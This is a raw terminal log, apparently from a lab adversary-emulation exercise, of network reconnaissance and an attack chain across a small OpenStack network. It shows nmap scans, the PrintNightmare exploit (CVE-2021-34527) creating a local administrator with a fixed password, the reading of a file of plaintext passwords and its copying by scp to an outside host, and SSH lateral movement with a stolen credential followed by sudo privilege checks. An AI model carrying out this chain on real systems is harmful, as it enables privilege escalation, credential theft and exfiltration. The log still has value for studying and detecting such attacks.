OS:%II=I%TS=A)SEQ(SP=102%GCD=1%ISR=102%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=103%GCD=1
OS:%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=
OS:A)SEQ(SP=FF%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M582ST11NW7%O2=M582
OS:ST11NW7%O3=M582NNT11NW7%O4=M582ST11NW7%O5=M582ST11NW7%O6=M582ST11)WIN(W1
OS:=FB34%W2=FB34%W3=FB34%W4=FB34%W5=FB34%W6=FB34)ECN(R=Y%DF=Y%T=40%W=FD5C%O
OS:=M582NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N
OS:)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=
OS:S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF
OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=
OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop 
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

TRACEROUTE
HOP RTT     ADDRESS
1   1.48 ms host-10-0-1-12.openstacklocal (10.0.1.12)

Nmap scan report for host-10-0-1-16.openstacklocal (10.0.1.16)
Host is up (0.0013s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e0:bc:d1:60:a2:6f:74:4d:7b:4e:9d:ea:f8:61:e9:cd (RSA)
|   256 21:8c:0b:45:13:ab:87:ac:ac:03:26:96:f0:32:2f:10 (ECDSA)
|_  256 b7:9f:15:fb:ef:83:48:e0:96:f6:65:0a:06:da:49:33 (ED25519)
80/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e0:bc:d1:60:a2:6f:74:4d:7b:4e:9d:ea:f8:61:e9:cd (RSA)
|   256 21:8c:0b:45:13:ab:87:ac:ac:03:26:96:f0:32:2f:10 (ECDSA)
|_  256 b7:9f:15:fb:ef:83:48:e0:96:f6:65:0a:06:da:49:33 (ED25519)
222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e0:bc:d1:60:a2:6f:74:4d:7b:4e:9d:ea:f8:61:e9:cd (RSA)
|   256 21:8c:0b:45:13:ab:87:ac:ac:03:26:96:f0:32:2f:10 (ECDSA)
|_  256 b7:9f:15:fb:ef:83:48:e0:96:f6:65:0a:06:da:49:33 (ED25519)
666/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e0:bc:d1:60:a2:6f:74:4d:7b:4e:9d:ea:f8:61:e9:cd (RSA)
|   256 21:8c:0b:45:13:ab:87:ac:ac:03:26:96:f0:32:2f:10 (ECDSA)
|_  256 b7:9f:15:fb:ef:83:48:e0:96:f6:65:0a:06:da:49:33 (ED25519)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
MAC Address: FA:16:3E:D5:97:29 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/23%OT=22%CT=1%CU=32759%PV=Y%DS=1%DC=D%G=Y%M=FA163E%
OS:TM=6741F6D0%P=i686-pc-windows-windows)SEQ(SP=101%GCD=1%ISR=109%TI=Z%CI=Z
OS:%II=I%TS=A)SEQ(SP=101%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=103%GCD=1
OS:%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=104%TI=Z%CI=Z%II=I%TS=
OS:A)SEQ(SP=108%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M582ST11NW7%O2=M58
OS:2ST11NW7%O3=M582NNT11NW7%O4=M582ST11NW7%O5=M582ST11NW7%O6=M582ST11)WIN(W
OS:1=FB34%W2=FB34%W3=FB34%W4=FB34%W5=FB34%W6=FB34)ECN(R=Y%DF=Y%T=40%W=FD5C%
OS:O=M582NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=
OS:N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A
OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%D
OS:F=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL
OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

TRACEROUTE
HOP RTT     ADDRESS
1   1.32 ms host-10-0-1-16.openstacklocal (10.0.1.16)

Nmap scan report for host-10-0-1-20.openstacklocal (10.0.1.20)
Host is up (0.0016s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION 
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 d2:f9:a4:90:c2:ad:a5:bf:8f:e8:95:89:bb:e0:62:6a (RSA)
|   256 8c:f0:b2:ef:d8:1e:57:aa:24:ec:b3:6d:1e:95:f8:c7 (ECDSA)
|_  256 88:ac:06:11:9d:85:97:0d:50:cc:25:54:3e:1b:84:06 (ED25519)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Standard Evaluation 17763 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=it-win-share
| Not valid before: 2024-11-22T12:32:56
|_Not valid after:  2025-05-24T12:32:56
|_ssl-date: 2024-11-23T15:37:51+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: IT-WIN-SHARE
|   NetBIOS_Domain_Name: IT-WIN-SHARE
|   NetBIOS_Computer_Name: IT-WIN-SHARE
|   DNS_Domain_Name: it-win-share
|   DNS_Computer_Name: it-win-share
|   Product_Version: 10.0.17763
|_  System_Time: 2024-11-23T15:37:17+00:00
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2024-11-23T15:37:51+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Cloudbase-Init WinRM
| Not valid before: 2024-11-22T12:38:49
|_Not valid after:  2034-11-21T12:38:49
| tls-alpn:
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
MAC Address: FA:16:3E:1B:95:5A (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/23%OT=22%CT=1%CU=38225%PV=Y%DS=1%DC=D%G=Y%M=FA163E%
OS:TM=6741F6D0%P=i686-pc-windows-windows)SEQ(SP=101%GCD=1%ISR=10E%TI=I%CI=I
OS:%II=I%SS=S%TS=U)SEQ(SP=104%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP
OS:=104%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=106%GCD=1%ISR=109%TI=
OS:I%CI=I%II=I%SS=S%TS=U)SEQ(SP=FD%GCD=1%ISR=104%TI=I%CI=I%II=I%SS=S%TS=U)O
OS:PS(O1=M582NW8NNS%O2=M582NW8NNS%O3=M582NW8%O4=M582NW8NNS%O5=M582NW8NNS%O6
OS:=M582NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=
OS:Y%T=80%W=FFFF%O=M582NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q
OS:=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%
OS:A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%D
OS:F=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O
OS:=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80
OS:%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -11m59s, deviation: 26m48s, median: 0s
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: IT-WIN-SHARE, NetBIOS user: <unknown>, NetBIOS MAC: fa:16:3e:1b:95:5a (unknown)
| smb-os-discovery:
|   OS: Windows Server 2019 Standard Evaluation 17763 (Windows Server 2019 Standard Evaluation 6.3)
|   Computer name: it-win-share
|   NetBIOS computer name: IT-WIN-SHARE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-11-23T16:37:18+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE
HOP RTT     ADDRESS
1   1.64 ms host-10-0-1-20.openstacklocal (10.0.1.20)

Nmap scan report for host-10-0-1-15.openstacklocal (10.0.1.15) 
Host is up (0.0012s latency). 
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 65:0b:f8:fe:2d:a9:a1:f8:ee:36:97:ed:ae:74:0e:14 (RSA)
|   256 02:99:1a:67:38:73:0e:3b:d9:ba:6a:43:5a:73:12:8d (ECDSA)
|_  256 3c:c5:57:c8:27:1c:03:4a:5a:5f:98:46:19:28:97:d5 (ED25519)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-11-23T15:39:08+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=it-win-pc-1
| Not valid before: 2024-11-22T12:32:52
|_Not valid after:  2025-05-24T12:32:52
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=Cloudbase-Init WinRM
| Not valid before: 2024-11-22T12:38:55
|_Not valid after:  2034-11-21T12:38:55
|_ssl-date: 2024-11-23T15:39:08+00:00; 0s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn:
|_  http/1.1
|_http-title: Not Found
Device type: general purpose
Running: Microsoft Windows 2019
OS CPE: cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2019
Network Distance: 0 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-11-23T15:38:40
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

Post-scan script results:
| clock-skew:
|   0s:
|     10.0.1.5 (host-10-0-1-5.openstacklocal)
|     10.0.1.20 (host-10-0-1-20.openstacklocal)
|_    10.0.1.15 (host-10-0-1-15.openstacklocal)
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (7 hosts up) scanned in 177.17 seconds

PS C:\Users\TestAdmin> ls


    Directory: C:\Users\TestAdmin


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/23/2024   1:37 PM                .ssh
d-r---       11/23/2024   1:36 PM                3D Objects
d-r---       11/23/2024   1:36 PM                Contacts
d-r---       11/23/2024   4:03 PM                Desktop
d-r---       11/23/2024   2:24 PM                Documents
d-r---       11/23/2024   1:58 PM                Downloads
d-r---       11/23/2024   1:36 PM                Favorites
d-r---       11/23/2024   1:36 PM                Links
d-r---       11/23/2024   1:36 PM                Music
d-r---       11/23/2024   1:47 PM                OneDrive
d-r---       11/23/2024   1:36 PM                Pictures
d-r---       11/23/2024   1:36 PM                Saved Games
d-r---       11/23/2024   1:36 PM                Searches
d-r---       11/23/2024   1:36 PM                Videos
-a----       11/23/2024   2:55 PM           1488 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk 
-a----       11/23/2024   4:26 PM         178563 CVE-2021-34527.ps1
------       11/23/2024   3:57 PM              0 file_read.etl
------       11/23/2024   3:57 PM              0 Powershell_payload.etl
------       11/23/2024   3:57 PM              0 Registry_read.etl
-a----       11/23/2024   2:15 PM              9 start

PS C:\Users\TestAdmin> Import-Module .\CVE-2021-34527.ps1
PS C:\Users\TestAdmin> Invoke-Nightmare 
[+] using default new user: adm1n 
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\TestAdmin\AppData\Local\Temp\3\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\mxd
wdrv.dll"
[+] added user  as local administrator 
[+] deleting payload from C:\Users\TestAdmin\AppData\Local\Temp\3\nightmare.dll

PS C:\Users\TestAdmin> $user = "adm1n"
PS C:\Users\TestAdmin> $pw = "P@ssw0rd"
PS C:\Users\TestAdmin> $password = $pw | ConvertTo-SecureString -AsPlainText -Force
PS C:\Users\TestAdmin> $cred = New-Object System.Management.Automation.PSCredential -ArgumentList $user,$password     
PS C:\Users\TestAdmin> New-PSSession -Credential $cred | Enter-PSSession 
[localhost]: PS C:\Users\adm1n\Documents> whoami
it-win-pc-1\adm1n 

[localhost]: PS C:\Users\adm1n\Documents> cd C:\Users\TestAdmin\Documents\
[localhost]: PS C:\Users\TestAdmin\Documents> ls


    Directory: C:\Users\TestAdmin\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/23/2024   1:39 PM                WindowsPowerShell
-a----       11/23/2024   2:24 PM          30897 MITRE-ATTACK-EVALS.HTML
-a----       11/23/2024   2:24 PM             46 pw.txt

[localhost]: PS C:\Users\TestAdmin\Documents> Copy-Item .\pw.txt C:\Users\TestAdmin\pw.txt
[localhost]: PS C:\Users\TestAdmin\Documents> type .\pw.txt
ubuntu DragonSwordFish23% 
TestAdmin secreT123%
[localhost]: PS C:\Users\TestAdmin\Documents> scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password pw.txt debian@10.1.3.165:/home/debian/

[hang]
exit 
PS C:\Users\TestAdmin> scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password pw.txt debian@10.1.3.165:/home/debian/
The authenticity of host '10.1.3.165 (10.1.3.165)' can't be established.
ECDSA key fingerprint is SHA256:1A0mQ1Z890Ppt80uWzMOmrArGDQ+QRdz8GiTm+XyLFg.
Are you sure you want to continue connecting (yes/no)?
Warning: Permanently added '10.1.3.165' (ECDSA) to the list of known hosts.
debian@10.1.3.165's password:
pw.txt    
PS C:\Users\TestAdmin> ssh -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password ubuntu@10.0.1.16 -p 666
ubuntu@10.0.1.16's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-164-generic x86_64) 

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Nov 23 16:58:57 CET 2024

  System load:  1.2                Processes:             122
  Usage of /:   10.6% of 28.89GB   Users logged in:       0
  Memory usage: 8%                 IPv4 address for ens3: 10.0.1.16 
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

144 updates can be applied immediately.
107 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

14 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

New release '22.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Sat Nov 23 15:57:09 2024 from 10.0.1.5
ubuntu@IT-Linux-PC-1:~$ whoami
ubuntu  
ubuntu@IT-Linux-PC-1:~$ (cat /proc/version || uname -a ) 2>/dev/null 
Linux version 5.4.0-164-generic (buildd@bos03-amd64-056) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #181-Ub
untu SMP Fri Sep 1 13:41:22 UTC 2023
ubuntu@IT-Linux-PC-1:~$ echo $PATH 
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
ubuntu@IT-Linux-PC-1:~$ cat /proc/version 
Linux version 5.4.0-164-generic (buildd@bos03-amd64-056) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #181-Ub
untu SMP Fri Sep 1 13:41:22 UTC 2023
ubuntu@IT-Linux-PC-1:~$ uname -a 
Linux IT-Linux-PC-1 5.4.0-164-generic #181-Ubuntu SMP Fri Sep 1 13:41:22 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux 
ubuntu@IT-Linux-PC-1:~$ sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
ubuntu@IT-Linux-PC-1:~$ sudo -V
Sudo version 1.8.31 
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
ubuntu@IT-Linux-PC-1:~$ ls 
Documents                  IT-Linux-PC-1_pcap.tar.gz  somedebugnotes.txt         tshark 
IT-Linux-PC-1_logs.tar.gz  audit.rules                someotherworkdocument.txt  workdocument.txt
ubuntu@IT-Linux-PC-1:~$ cd Documents/ 
ubuntu@IT-Linux-PC-1:~/Documents$ ls 
secret.txt 
ubuntu@IT-Linux-PC-1:~/Documents$ cat secret.txt  
This file is super secret, an APT actor would definetely want to exfiltrate thisubuntu@IT-Linux-PC-1:~/Documents$ ls
 -lah 
total 12K 
drwxr-xr-x 2 root   root   4.0K Nov 11 12:42 .
drwxr-xr-x 9 ubuntu ubuntu 4.0K Nov 20 15:57 ..
-rw-r--r-- 1 root   root     80 Nov 11 12:42 secret.txt
ubuntu@IT-Linux-PC-1:~/Documents$ sudo -l 
Matching Defaults entries for ubuntu on IT-Linux-PC-1: 
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ubuntu may run the following commands on IT-Linux-PC-1:
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: ALL
    (root) NOPASSWD: /usr/bin/vim

ubuntu@IT-Linux-PC-1:~/Documents$ nmap -A -p- -sV -sC -oN nmap.txt 10.0.1.0/25 
Failed to open normal output file nmap.txt for writing 
QUITTING!
ubuntu@IT-Linux-PC-1:~/Documents$ cd .. 
ubuntu@IT-Linux-PC-1:~$ nmap -A -p- -sV -sC -oN nmap.txt 10.0.1.0/25 
Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-23 17:08 CET 
Nmap scan report for host-10-0-1-1.openstacklocal (10.0.1.1) 
Host is up (0.0018s latency).
Not shown: 65534 closed ports 
PORT     STATE    SERVICE VERSION
9697/tcp filtered unknown

Nmap scan report for 10.0.1.2
Host is up (0.0070s latency).
Not shown: 65534 closed ports 
PORT   STATE SERVICE VERSION
53/tcp open  domain  dnsmasq 2.90
| dns-nsid:
|_  bind.version: dnsmasq-2.90

Nmap scan report for host-10-0-1-5.openstacklocal (10.0.1.5)
Host is up (0.012s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
139/tcp  open  netbios-ssn   Samba smbd 4.6.2
445/tcp  open  netbios-ssn   Samba smbd 4.6.2
1080/tcp open  socks5        (No authentication; connection failed)
| socks-auth-info:
|_  No authentication
| socks-open-proxy:
|   status: open
|   versions:
|     socks4
|_    socks5
3389/tcp open  ms-wbt-server xrdp
5355/tcp open  llmnr?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 

Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2024-11-23T16:11:20
|_  start_date: N/A

Nmap scan report for host-10-0-1-12.openstacklocal (10.0.1.12)
Host is up (0.0089s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
69/tcp   open  ssh           OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp   open  ssh           OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
222/tcp  open  ssh           OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
666/tcp  open  ssh           OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
3389/tcp open  ms-wbt-server xrdp
5355/tcp open  llmnr?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for host-10-0-1-15.openstacklocal (10.0.1.15) 
Host is up (0.011s latency).
Not shown: 65518 closed ports
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 65:0b:f8:fe:2d:a9:a1:f8:ee:36:97:ed:ae:74:0e:14 (RSA)
|   256 02:99:1a:67:38:73:0e:3b:d9:ba:6a:43:5a:73:12:8d (ECDSA)
|_  256 3c:c5:57:c8:27:1c:03:4a:5a:5f:98:46:19:28:97:d5 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: IT-WIN-PC-1
|   NetBIOS_Domain_Name: IT-WIN-PC-1
|   NetBIOS_Computer_Name: IT-WIN-PC-1
|   DNS_Domain_Name: it-win-pc-1
|   DNS_Computer_Name: it-win-pc-1
|   Product_Version: 10.0.17763
|_  System_Time: 2024-11-23T16:14:51+00:00
| ssl-cert: Subject: commonName=it-win-pc-1
| Not valid before: 2024-11-22T12:32:52
|_Not valid after:  2025-05-24T12:32:52
|_ssl-date: 2024-11-23T16:14:58+00:00; 0s from scanner time.
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=Cloudbase-Init WinRM
| Not valid before: 2024-11-22T12:38:55
|_Not valid after:  2034-11-21T12:38:55
|_ssl-date: 2024-11-23T16:14:58+00:00; 0s from scanner time.
| tls-alpn:
|_  http/1.1
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 

Host script results:
|_nbstat: NetBIOS name: IT-WIN-PC-1, NetBIOS user: <unknown>, NetBIOS MAC: fa:16:3e:2b:6f:1f (unknown)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2024-11-23T16:14:51
|_  start_date: N/A

Nmap scan report for host-10-0-1-16.openstacklocal (10.0.1.16)
Host is up (0.000052s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
69/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
666/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
3389/tcp open  ms-wbt-server xrdp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for host-10-0-1-20.openstacklocal (10.0.1.20)
Host is up (0.0016s latency).
Not shown: 65518 closed ports
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 d2:f9:a4:90:c2:ad:a5:bf:8f:e8:95:89:bb:e0:62:6a (RSA)
|   256 8c:f0:b2:ef:d8:1e:57:aa:24:ec:b3:6d:1e:95:f8:c7 (ECDSA)
|_  256 88:ac:06:11:9d:85:97:0d:50:cc:25:54:3e:1b:84:06 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2019 Standard Evaluation 17763 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: IT-WIN-SHARE 
|   NetBIOS_Domain_Name: IT-WIN-SHARE
|   NetBIOS_Computer_Name: IT-WIN-SHARE
|   DNS_Domain_Name: it-win-share
|   DNS_Computer_Name: it-win-share
|   Product_Version: 10.0.17763
|_  System_Time: 2024-11-23T16:14:54+00:00
| ssl-cert: Subject: commonName=it-win-share
| Not valid before: 2024-11-22T12:32:56
|_Not valid after:  2025-05-24T12:32:56
|_ssl-date: 2024-11-23T16:14:58+00:00; -1s from scanner time.
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=Cloudbase-Init WinRM
| Not valid before: 2024-11-22T12:38:49
|_Not valid after:  2034-11-21T12:38:49
|_ssl-date: 2024-11-23T16:14:58+00:00; 0s from scanner time.
| tls-alpn:
|_  http/1.1
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
